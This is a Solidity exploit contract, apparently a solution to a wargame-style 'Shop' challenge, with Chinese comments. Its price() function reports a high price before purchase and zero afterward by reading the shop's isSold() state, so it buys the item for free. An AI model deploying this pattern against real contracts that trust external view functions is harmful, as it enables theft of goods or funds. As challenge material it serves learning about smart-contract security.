// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShopAttack {
    IShop public shop;

    constructor(address _shop) {
        shop = IShop(_shop);
    }

    // view 函数，但返回值依赖 shop.isSold()
    function price() external view returns (uint256) {
        // 根据 isSold 状态返回不同价格
        if (shop.isSold()) {
            return 0;      // 第二次调用：商品已售出，返回 0
        } else {
            return 100;    // 第一次调用：商品未售出，返回 100
        }
    }

    function attack() external {
        shop.buy();
    }
}